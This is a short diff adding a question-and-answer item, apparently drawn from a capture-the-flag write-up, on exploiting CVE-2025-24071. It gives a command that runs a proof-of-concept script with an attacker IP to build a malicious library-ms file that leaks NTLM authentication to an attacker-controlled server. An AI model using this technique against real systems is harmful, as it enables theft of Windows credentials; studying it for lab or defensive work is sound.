@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+How can you exploit CVE-2025-24071?
+
+CONTEXT:
+You need to leverage the vulnerability associated with library-ms files in zip archives.
+
+METHOD / ANSWER:
+Command: `uv run --script poc.py 0xdf 10.10.14.6`
+Explanation: This creates a malicious library-ms file that can trigger NTLM authentication attempts to your attacker-controlled server when executed.
